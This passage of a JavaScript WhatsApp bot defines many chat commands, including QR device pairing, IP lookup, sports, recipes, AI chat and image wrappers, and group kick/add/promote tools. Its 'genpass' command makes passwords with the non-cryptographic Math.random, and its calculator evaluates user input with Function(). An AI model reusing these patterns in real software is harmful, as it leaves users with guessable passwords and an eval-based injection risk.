      const ps = makeWASocket({ auth: state, printQRInTerminal: false, browser: Browsers.ubuntu('Chrome'), connectTimeoutMs: 60000, defaultQueryTimeoutMs: 60000, keepAliveIntervalMs: 30000, logger: pino({ level: 'silent' }), markOnlineOnConnect: true });
      activePairs.set(clean, ps);
      ps.ev.on('creds.update', saveCreds);
      attachFullBotHandlers(ps);
      let sent = false;
      ps.ev.on('connection.update', async ({ qr, connection }) => {
        if (qr && !sent) {
          sent = true;
          try { try { await sock.sendMessage(sender, { delete: load.key }); } catch(e) {} await sock.sendMessage(sender, { image: { url: `https://api.qrserver.com/v1/create-qr-code/?size=600x600&data=${encodeURIComponent(qr)}` }, caption: `📱 *PAIRING QR for +${clean}*\n\n1. Open WhatsApp on +${clean}\n2. Settings → Linked Devices\n3. Link a Device\n4. Scan the QR above\n\n⏱️ Expires in ~60s.`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } catch(e) {}
        }
        if (connection === 'open') { try { await style.reply(sock, sender, `✅ +${clean} linked successfully! This number now runs the FULL bot.`, msg); } catch(e) {} }
      });
    } catch(e) { await style.reply(sock, sender, style.error('QR pairing failed: ' + e.message), msg); }
    return;
  }
  await style.react(sock, sender, msg, '🔳');
  await sock.sendMessage(sender, { image: { url: `https://api.qrserver.com/v1/create-qr-code/?size=512x512&data=${encodeURIComponent(args.join(' '))}` }, caption: style.success(`QR: ${args.join(' ')}`), contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
}};

builtInCommands.iplookup = { desc: '🌐 IP geo', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .iplookup <ip>'), msg);
  await style.react(sock, sender, msg, '🌐');
  try { const r = await axios.get(`http://ip-api.com/json/${args[0]}`, { timeout: 10000 }); if (r.data.status === 'fail') return style.reply(sock, sender, style.error('Failed.'), msg); const d = r.data; await style.reply(sock, sender, style.box('IP INTEL', [style.kv('IP', d.query), style.kv('Country', d.country), style.kv('City', d.city), style.kv('ISP', d.isp)].join('\n')), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.myip = { desc: '🌍 Host IP', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🌍');
  try { const r = await axios.get('http://ip-api.com/json/', { timeout: 10000 }); const d = r.data; await style.reply(sock, sender, style.box('HOST IP', [style.kv('IP', d.query), style.kv('Country', d.country), style.kv('ISP', d.isp)].join('\n')), msg); } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.jid = { desc: '🏷️ JID', execute: async (sock, sender, args, msg) => {
  const target = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || msg.key.participant || sender;
  await style.react(sock, sender, msg, '🏷️');
  await style.reply(sock, sender, style.box('JID', style.kv('JID', target)), msg);
}};

builtInCommands.idch = { desc: '🆔 Chat ID', execute: async (sock, sender, args, msg) => { await style.react(sock, sender, msg, '🆔'); await style.reply(sock, sender, style.box('ID', style.kv('JID', sender)), msg); } };

/* ── UTILITIES ── */
builtInCommands.currency = { desc: '💱 Currency', execute: async (sock, sender, args, msg) => {
  if (args.length < 3) return style.reply(sock, sender, style.error('Usage: .currency <amt> <from> <to>'), msg);
  await style.react(sock, sender, msg, '💱');
  try { const r = await axios.get(`https://api.exchangerate-api.com/v4/latest/${args[1].toUpperCase()}`, { timeout: 10000 }); const rate = r.data.rates[args[2].toUpperCase()]; if (!rate) return style.reply(sock, sender, style.error('Invalid code.'), msg); await style.reply(sock, sender, style.box('CURRENCY', `${args[0]} ${args[1].toUpperCase()} = *${(parseFloat(args[0]) * rate).toFixed(2)} ${args[2].toUpperCase()}*`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.genpass = { desc: '🔐 Password', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🔐');
  const len = Math.min(Math.max(parseInt(args[0]) || 16, 4), 128);
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%&!';
  let p = ''; for (let i = 0; i < len; i++) p += chars[Math.floor(Math.random() * chars.length)];
  await style.reply(sock, sender, style.box('PASSWORD', `${len} chars:\n*${p}*`), msg);
}};

builtInCommands.horoscope = { desc: '🔮 Horoscope', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .horoscope <sign>'), msg);
  await style.react(sock, sender, msg, '🔮');
  try { const r = await axios.post(`https://aztro.sameerkumar.website/?sign=${args[0]}&day=today`, {}, { timeout: 10000 }); const d = r.data; await style.reply(sock, sender, style.box('HOROSCOPE', [style.kv('Sign', args[0].toUpperCase()), style.kv('Mood', d.mood), style.kv('Color', d.color), '', `_${d.description}_`].join('\n')), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.qc = { desc: '💬 Quote card', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .qc <text>'), msg);
  await style.react(sock, sender, msg, '💬');
  const t = args.join(' ');
  try { await sock.sendMessage(sender, { image: { url: `https://image.pollinations.ai/prompt/${encodeURIComponent(`quote card: "${t}", dark aesthetic, minimalist typography`)}?width=800&height=800&nologo=true` }, caption: style.success(`_"${t}"_`), contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.autobot = { desc: '🤖 Private broadcast', execute: async (sock, sender, args, msg) => {
  autoBotActive = !autoBotActive; global.autoBotActive = autoBotActive;
  let g = {}; try { g = await sock.groupFetchAllParticipating(); } catch(e) {}
  const ids = Object.keys(g);
  const ann = autoBotActive ? '🔒 AutoBot ON — owner offline' : '👁️ AutoBot OFF — owner online';
  for (const id of ids) { try { await sock.sendMessage(id, { text: ann }); await delay(400); } catch(e) {} }
  await style.reply(sock, sender, style.success(`Announced to ${ids.length} groups.`), msg);
}};

builtInCommands.recipe = { desc: '🍳 Recipe', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .recipe <dish>'), msg);
  await style.react(sock, sender, msg, '🍳');
  try { const r = await axios.get(`https://www.themealdb.com/api/json/v1/1/search.php?s=${encodeURIComponent(args.join(' '))}`, { timeout: 15000 }); const m = r.data.meals?.[0]; if (!m) return style.reply(sock, sender, style.error('Not found.'), msg); const cap = `🍽️ *${m.strMeal}*\n${style.kv('Category', m.strCategory)}\n${style.kv('Area', m.strArea)}\n\n${m.strInstructions.substring(0, 600)}...`; await sock.sendMessage(sender, { image: { url: m.strMealThumb }, caption: cap, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.remind = { desc: '⏰ Reminder', execute: async (sock, sender, args, msg) => {
  if (args.length < 2) return style.reply(sock, sender, style.error('Usage: .remind <secs> <msg>'), msg);
  await style.react(sock, sender, msg, '⏰');
  const s = parseInt(args[0]), t = args.slice(1).join(' ');
  await style.reply(sock, sender, style.success(`Reminder set for ${s}s.`), msg);
  setTimeout(() => style.reply(sock, sender, `⏰ *REMINDER*\n\n${t}`, msg), s * 1000);
}};

builtInCommands.sciencefact = { desc: '🔬 Science fact', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🔬');
  try { const r = await axios.get('https://uselessfacts.jsph.pl/random.json?language=en', { timeout: 10000 }); await style.reply(sock, sender, style.box('SCIENCE', r.data.text), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.book = { desc: '📖 Book', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .book <title>'), msg);
  await style.react(sock, sender, msg, '📖');
  try { const r = await axios.get(`https://openlibrary.org/search.json?q=${encodeURIComponent(args.join(' '))}`, { timeout: 15000 }); const b = r.data.docs?.[0]; if (!b) return style.reply(sock, sender, style.error('No results.'), msg); await style.reply(sock, sender, style.box('BOOK', [style.kv('Title', b.title), style.kv('Author', b.author_name?.[0] || 'Unknown'), style.kv('First published', b.first_publish_year || 'N/A')].join('\n')), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.readmore = { desc: '📑 Readmore', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '📑');
  await style.reply(sock, sender, `${args.join(' ') || 'Hidden below:'} ${String.fromCharCode(8206)}${'\n'.repeat(4005)}${String.fromCharCode(8207)} Expanded!`, msg);
}};


/* ── RELIGIOUS / SPORTS / WRLD / ANIME ── */
builtInCommands.verse = { desc: '⛪ Bible verse', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '⛪');
  const list = ['john 3:16', 'psalm 23:1', 'philippians 4:13', 'jeremiah 29:11', 'romans 8:28'];
  try { const r = await axios.get(`https://bible-api.com/${encodeURIComponent(list[Math.floor(Math.random() * list.length)])}?translation=kjv`, { timeout: 12000 }); await style.reply(sock, sender, style.box('📖 VERSE', `*${r.data.reference}*\n\n"${r.data.text.trim()}"`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.pray = { desc: '⛪ Prayer', execute: async (sock, sender, args, msg) => { await style.react(sock, sender, msg, '⛪'); await style.reply(sock, sender, style.box('PRAYER', 'Lord, guide us through this day with wisdom, strength, and compassion. Amen.'), msg); } };

builtInCommands.nba = { desc: '🏀 NBA', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🏀');
  try { const today = new Date().toISOString().slice(0, 10); const r = await axios.get(`https://www.balldontlie.io/api/v1/games?dates[]=${today}`, { timeout: 12000 }); const games = r.data.data || []; if (!games.length) return style.reply(sock, sender, style.box('🏀 NBA', 'No games today.'), msg); await style.reply(sock, sender, style.box('🏀 NBA', games.map(g => `${g.visitor_team.full_name} ${g.visitor_team_score} @ ${g.home_team.full_name} ${g.home_team_score}`).join('\n')), msg); }
  catch(e) { await style.reply(sock, sender, style.box('🏀 NBA', 'Unavailable.'), msg); }
}};

builtInCommands.hockey = { desc: '🏒 NHL', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🏒');
  try { const r = await axios.get('https://api-web.nhle.com/v1/scoreboard/now', { timeout: 12000 }); const games = r.data?.gamesByDate?.[0]?.games || []; if (!games.length) return style.reply(sock, sender, style.box('🏒 NHL', 'No games.'), msg); await style.reply(sock, sender, style.box('🏒 NHL', games.map(g => `${g.awayTeam.abbrev} ${g.awayTeam.score ?? '-'} @ ${g.homeTeam.abbrev} ${g.homeTeam.score ?? '-'}`).join('\n')), msg); }
  catch(e) { await style.reply(sock, sender, style.box('🏒 NHL', 'Unavailable.'), msg); }
}};

builtInCommands.football = builtInCommands.fifa = { desc: '⚽ Football', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '⚽');
  try { const r = await axios.get(`https://www.thesportsdb.com/api/v1/json/3/eventsnextleague.php?id=4328`, { timeout: 12000 }); const list = r.data?.events || []; if (list.length) { let out = ''; list.slice(0, 8).forEach(m => { out += `${m.strHomeTeam} vs ${m.strAwayTeam}\n📅 ${m.dateEvent} ${m.strTime || ''}\n\n`; }); return style.reply(sock, sender, style.box('⚽ FOOTBALL (Upcoming)', out), msg); } } catch(e) {}
  await style.reply(sock, sender, style.box('⚽ FOOTBALL', 'Live data unavailable right now.'), msg);
}};

builtInCommands['year anime info'] = { desc: '🀄 Top anime by year', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🀄');
  const y = parseInt(args[0]) || new Date().getFullYear();
  try { const r = await axios.get(`https://api.jikan.moe/v4/anime?start_date=${y}-01-01&end_date=${y}-12-31&order_by=score&sort=desc&limit=10`, { timeout: 15000 }); const list = r.data.data || []; if (!list.length) return style.reply(sock, sender, style.box(`ANIME ${y}`, 'No results.'), msg); await style.reply(sock, sender, style.box(`TOP ${y}`, list.map((a, i) => `${i + 1}. *${a.title}* — ⭐ ${a.score || '?'}`).join('\n')), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands['download anime'] = { desc: '🀄 Anime search', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .download anime <title>'), msg);
  await style.react(sock, sender, msg, '🀄');
  try { const r = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(args.join(' '))}&limit=5`, { timeout: 15000 }); const list = r.data.data || []; if (!list.length) return style.reply(sock, sender, style.error('No anime.'), msg); await style.reply(sock, sender, style.box('ANIME', list.map((a, i) => `${i + 1}. *${a.title}* (${a.year || '?'}) ⭐${a.score || '?'}\n🔗 ${a.url}`).join('\n\n')), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.ufo = builtInCommands['alien news'] = { desc: '👽 UFO report', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '👽');
  try { const r = await axios.get('https://www.reddit.com/r/UFOs/new.json?limit=15', { headers: { 'User-Agent': 'VanteviousBot/1.0' }, timeout: 12000 }); const posts = (r.data?.data?.children || []).filter(p => !p.data.stickied); if (!posts.length) throw new Error('none'); const p = posts[Math.floor(Math.random() * Math.min(posts.length, 8))].data; const cap = `👽 *${p.title}*\n\n📡 r/UFOs\n🔗 https://reddit.com${p.permalink}`; if (p.url?.match(/\.(jpg|jpeg|png)$/i)) await sock.sendMessage(sender, { image: { url: p.url }, caption: cap, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); else await style.reply(sock, sender, style.box('UFO RADAR', cap), msg); }
  catch(e) { await style.reply(sock, sender, style.box('UFO RADAR', 'Radar offline.'), msg); }
}};

builtInCommands['scan aliens'] = { desc: '👽 NASA scan', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '👽');
  try { const r = await axios.get(`https://api.nasa.gov/planetary/apod?count=1&api_key=${process.env.NASA_API_KEY || 'DEMO_KEY'}`, { timeout: 15000 }); const d = r.data[0]; const cap = `👽 *ANOMALY*\n\n*${d.title}*\n📅 ${d.date}\n\n_${(d.explanation || '').substring(0, 400)}..._`; if (d.media_type === 'image') await sock.sendMessage(sender, { image: { url: d.url }, caption: cap, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); else await style.reply(sock, sender, cap, msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands['area 61'] = { desc: '👽 Declassified', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '👽');
  const f = ["Project Blue Book (1952–1969) investigated 12,618 UFO sightings; 701 remained unidentified.", "Area 51 was officially acknowledged by the CIA in 2013.", "NASA's Kepler mission confirmed over 2,700 exoplanets.", "The Wow! Signal (1977) lasted 72 seconds and has never been explained.", "The Tic Tac UAP video (2004) was confirmed authentic by the Pentagon in 2020."];
  await style.reply(sock, sender, style.box('📁 DECLASSIFIED', f[Math.floor(Math.random() * f.length)]), msg);
}};

builtInCommands['did you know'] = { desc: '🌍 Fact', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🌍');
  const f = ["Honey never spoils.", "Octopuses have three hearts and blue blood.", "A day on Venus is longer than a year on Venus.", "Bananas are berries, strawberries aren't.", "Eiffel Tower grows ~15 cm in summer."];
  await style.reply(sock, sender, style.box('GLOBAL FACT', f[Math.floor(Math.random() * f.length)]), msg);
}};

builtInCommands['something i dont know'] = { desc: '🌍 Obscure', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🌍');
  try { const r = await axios.get('https://uselessfacts.jsph.pl/api/v2/facts/random', { timeout: 10000 }); await style.reply(sock, sender, style.box('🌍 OBSCURE', r.data.text), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

/* ── AI ── */
const aiReply = async (sock, sender, args, msg, sys = 'You are a helpful concise assistant.') => {
  if (!args.length) return style.reply(sock, sender, style.error('Provide a prompt.'), msg);
  await style.react(sock, sender, msg, '🧠');
  const out = await askAI(args.join(' '), sys);
  if (!out) return style.reply(sock, sender, style.error('AI unavailable.'), msg);
  await style.reply(sock, sender, style.box('AI RESPONSE', fonts.script(out)), msg);
};
builtInCommands.ai = { desc: '🧠 GPT chat', execute: (s, a, r, m) => aiReply(s, a, r, m) };
builtInCommands.gpt = { desc: '🧠 GPT', execute: (s, a, r, m) => aiReply(s, a, r, m) };
builtInCommands.openai = { desc: '🧠 OpenAI', execute: (s, a, r, m) => aiReply(s, a, r, m) };
builtInCommands.gpt3 = { desc: '🤖 GPT-3.5', execute: (s, a, r, m) => aiReply(s, a, r, m) };
builtInCommands.gpt4 = { desc: '🤖 GPT-4', execute: (s, a, r, m) => aiReply(s, a, r, m) };
builtInCommands.metaai = { desc: '🌐 Meta AI', execute: (s, a, r, m) => aiReply(s, a, r, m, 'You are Meta AI — friendly and concise.') };
builtInCommands.wormgpt = { desc: '🥷 WormGPT', execute: (s, a, r, m) => aiReply(s, a, r, m, 'Direct, unfiltered tone.') };

builtInCommands.codeai = { desc: '💻 Code AI', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .codeai <query>'), msg);
  await style.react(sock, sender, msg, '💻');
  const c = await askAI(args.join(' '), 'You are an expert programmer.');
  if (!c) return style.reply(sock, sender, style.error('AI unavailable.'), msg);
  await style.reply(sock, sender, style.box('CODE AI', fonts.mono(c)), msg);
}};

builtInCommands.triviaai = { desc: '❓ AI trivia', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '❓');
  const c = await askAI('Give a challenging trivia question with multiple choice and answer at bottom.');
  if (!c) return style.reply(sock, sender, style.error('AI unavailable.'), msg);
  await style.reply(sock, sender, style.box('TRIVIA', c), msg);
}};

builtInCommands.gemini = { desc: '✨ Gemini', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .gemini <prompt>'), msg);
  await style.react(sock, sender, msg, '✨');
  if (process.env.GEMINI_API_KEY) { try { const r = await axios.post(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${process.env.GEMINI_API_KEY}`, { contents: [{ parts: [{ text: args.join(' ') }] }] }, { timeout: 30000 }); const out = r.data.candidates[0].content.parts[0].text; return style.reply(sock, sender, style.box('GEMINI', fonts.script(out)), msg); } catch(e) {} }
  const out = await askAI(args.join(' '), 'You are Gemini — precise and helpful.');
  if (!out) return style.reply(sock, sender, style.error('AI unavailable.'), msg);
  await style.reply(sock, sender, style.box('GEMINI', fonts.script(out)), msg);
}};

builtInCommands.image = builtInCommands.photoai = { desc: '🎨 AI image', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .image <prompt>'), msg);
  await style.react(sock, sender, msg, '🎨');
  try {
    const res = await APIs.generateImage(args.join(' '));
    if (res?.data?.url || res?.url) {
      await sock.sendMessage(sender, { image: { url: res.data?.url || res.url }, caption: style.success(`"${args.join(' ')}"`), contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
      return;
    }
  } catch(e) {}
  try { await sock.sendMessage(sender, { image: { url: `https://image.pollinations.ai/prompt/${encodeURIComponent(args.join(' '))}?width=1024&height=1024&nologo=true` }, caption: style.success(`"${args.join(' ')}"`), contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Render failed.'), msg); }
}};

builtInCommands.realistic = { desc: '🖼️ Photorealistic', execute: async (s, a, r, m) => { if (!r.length) return style.reply(s, a, style.error('Usage: .realistic <prompt>'), m); r.push('photorealistic, 8k'); return builtInCommands.image.execute(s, a, r, m); } };

builtInCommands.flux = { desc: '⚡ Flux', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .flux <prompt>'), msg);
  await style.react(sock, sender, msg, '⚡');
  try { await sock.sendMessage(sender, { image: { url: `https://image.pollinations.ai/prompt/${encodeURIComponent(args.join(' '))}?model=flux&width=1024&height=1024&nologo=true` }, caption: '𓆣 FLUX Render', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.nanobanana = { desc: '🍌 Nanobanana', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .nanobanana <prompt>'), msg);
  await style.react(sock, sender, msg, '🍌');
  try { await sock.sendMessage(sender, { image: { url: `https://image.pollinations.ai/prompt/${encodeURIComponent(args.join(' '))}?width=1024&height=1024&nologo=true` }, caption: '🍌 NANOBANANA', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.createlogo = { desc: '🏷️ Logo', execute: async (s, a, r, m) => { if (!r.length) return style.reply(s, a, style.error('Usage: .createlogo <brand>'), m); return builtInCommands.image.execute(s, a, [`professional modern minimalist vector logo for text "${r.join(' ')}", solid background`], m); } };

builtInCommands.stickerai = { desc: '✨ AI sticker', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .stickerai <prompt>'), msg);
  await style.react(sock, sender, msg, '✨');
  try { const r = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent(args.join(' ') + ', sticker style, white border')}?width=512&height=512&nologo=true`, { responseType: 'arraybuffer', timeout: 30000 }); const st = new Sticker(Buffer.from(r.data), { pack: BOT_NAME, author: OWNER_NAME, type: StickerTypes.FULL, quality: 70 }); await sock.sendMessage(sender, { sticker: await st.toBuffer() }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.lyrics = { desc: '🎤 Lyrics', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .lyrics <song>'), msg);
  await style.react(sock, sender, msg, '🎤');
  try { const r = await axios.get(`https://api.lyrics.ovh/v1/${encodeURIComponent(args[0])}/${encodeURIComponent(args.slice(1).join(' ') || args[0])}`, { timeout: 15000 }); await style.reply(sock, sender, style.box('LYRICS', fonts.script((r.data.lyrics || 'None').substring(0, 2000))), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Not found.'), msg); }
}};

builtInCommands.wiki = { desc: '📚 Wiki', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .wiki <subject>'), msg);
  await style.react(sock, sender, msg, '📚');
  try { const res = await APIs.wikiSearch(args.join('_')); if (res?.title && res?.extract) return style.reply(sock, sender, style.box(res.title, res.extract), msg); } catch(e) {}
  try { const r = await axios.get(`https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(args.join('_'))}`, { timeout: 15000 }); await style.reply(sock, sender, style.box(r.data.title, r.data.extract), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Not found.'), msg); }
}};

builtInCommands.define = { desc: '📖 Dictionary', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .define <word>'), msg);
  await style.react(sock, sender, msg, '📖');
  try { const r = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${args[0].toLowerCase()}`, { timeout: 10000 }); const e = r.data[0]; let out = `*${e.word}*\n`; if (e.phonetic) out += `_${e.phonetic}_\n\n`; e.meanings.forEach((mn, i) => { out += `*${i + 1}. ${mn.partOfSpeech}*\n`; mn.definitions.slice(0, 3).forEach((d, j) => { out += `${j + 1}) ${d.definition}\n`; }); out += '\n'; }); await style.reply(sock, sender, style.box(`DICT: ${args[0]}`, fonts.mono(out.trim())), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Not found.'), msg); }
}};

builtInCommands.wallpaper = { desc: '🖼️ Wallpaper', execute: async (sock, sender, args, msg) => { await style.react(sock, sender, msg, '🖼️'); await sock.sendMessage(sender, { image: { url: 'https://picsum.photos/800/1200' }, caption: style.success('Wallpaper.'), contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } };

builtInCommands.tts = { desc: '🗣️ TTS', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Provide text.'), msg);
  await style.react(sock, sender, msg, '🗣️');
  try {
    const { text, lang } = parseTtsInput(args);
    const audioBuffer = await generateSpeechAudio(text, lang);
    await sock.sendMessage(sender, { audio: audioBuffer, mimetype: 'audio/mpeg', ptt: true, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  } catch(e) {
    try { await sock.sendMessage(sender, { audio: { url: `https://translate.google.com/translate_tts?ie=UTF-8&tl=en&client=tw-ob&q=${encodeURIComponent(args.join(' '))}` }, mimetype: 'audio/mpeg', ptt: true, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
    catch(e2) { await style.reply(sock, sender, style.error('TTS failed.'), msg); }
  }
}};

builtInCommands.calc = { desc: '🧮 Calc', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .calc <expr>'), msg);
  await style.react(sock, sender, msg, '🧮');
  try { const e = args.join('').replace(/[^0-9+\-*/().%\s]/g, ''); await style.reply(sock, sender, style.box('CALC', `${e} = *${Function('"use strict";return(' + e + ')')()}*`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Bad expr.'), msg); }
}};

builtInCommands.weather = { desc: '🌤️ Weather', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .weather <city>'), msg);
  await style.react(sock, sender, msg, '🌤️');
  try {
    const res = await APIs.getWeather(args.join(' '));
    if (res?.data) return style.reply(sock, sender, style.box('🌤️ WEATHER', JSON.stringify(res.data, null, 2)), msg);
  } catch(e) {}
  try { const r = await axios.get(`https://wttr.in/${encodeURIComponent(args.join(' '))}?format=j1`, { timeout: 10000, headers: { 'User-Agent': 'curl/7.64.1' } }); const c = r.data.current_condition[0], t = r.data.weather[0], a = r.data.nearest_area[0]; await style.reply(sock, sender, style.box('🌤️ WEATHER', [style.kv('Location', `${a.areaName[0].value}, ${a.country[0].value}`), style.kv('Temp', `${c.temp_C}°C (feels ${c.FeelsLikeC}°C)`), style.kv('Status', c.weatherDesc[0].value), style.kv('Wind', `${c.windspeedKmph} km/h`), style.kv('Humidity', c.humidity + '%'), '', style.kv('Max/Min', `${t.maxtempC}/${t.mintempC}°C`)].join('\n')), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

/* ── GROUP MANAGEMENT ── */
builtInCommands.tagall = { desc: '📢 Tag all', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '📢');
  const meta = await sock.groupMetadata(sender);
  const mentions = meta.participants.map(p => p.id);
  const list = mentions.map(m => `> 𓊅 @${m.split('@')[0]}`).join('\n');
  await sock.sendMessage(sender, { text: `╭━『 TAG ALL 』━╮\n${style.kv('Group', meta.subject)}\n${style.kv('Members', meta.participants.length)}\n╰━━━━━━━ ☉\n\n${list}`, mentions, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
}};

builtInCommands.hidetag = { desc: '👻 Hidden tag', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  await style.react(sock, sender, msg, '👻');
  const meta = await sock.groupMetadata(sender);
  await sock.sendMessage(sender, { text: `👻 *HIDDEN TAG*\n\n${args.join(' ') || 'Attention.'}`, mentions: meta.participants.map(p => p.id), contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
}};

builtInCommands.kick = { desc: '👢 Kick', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  const u = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || msg.message?.extendedTextMessage?.contextInfo?.participant;
  if (!u) return style.reply(sock, sender, style.error('Mention user.'), msg);
  await style.react(sock, sender, msg, '👢');
  await sock.groupParticipantsUpdate(sender, [u], 'remove');
  await style.reply(sock, sender, style.success('Removed.'), msg);
}};

builtInCommands.add = { desc: '➕ Add', execute: async (sock, sender, args, msg) => {
  if (!sender.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .add 2637xxxxxxx'), msg);
  await style.react(sock, sender, msg, '➕');
  try { const res = await sock.groupParticipantsUpdate(sender, args.map(n => n.replace(/[^0-9]/g, '') + '@s.whatsapp.net'), 'add'); await style.reply(sock, sender, style.box('ADD', res.map(r => `${r.status === '200' ? '✅' : '❌'} +${r.id.split('@')[0]} — ${r.status}`).join('\n')), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.promote = { desc: '🔼 Promote', execute: async (sock, sender, args, msg) => {
  const u = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
  if (!u) return style.reply(sock, sender, style.error('Mention user.'), msg);
  await style.react(sock, sender, msg, '🔼');
  await sock.groupParticipantsUpdate(sender, [u], 'promote');
  await style.reply(sock, sender, style.success('Promoted.'), msg);
}};

builtInCommands.demote = { desc: '🔽 Demote', execute: async (sock, sender, args, msg) => {
  const u = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
  if (!u) return style.reply(sock, sender, style.error('Mention user.'), msg);
  await style.react(sock, sender, msg, '🔽');
  await sock.groupParticipantsUpdate(sender, [u], 'demote');
  await style.reply(sock, sender, style.success('Demoted.'), msg);
}};

builtInCommands.join = { desc: '🚪 Join', execute: async (sock, sender, args, msg) => {
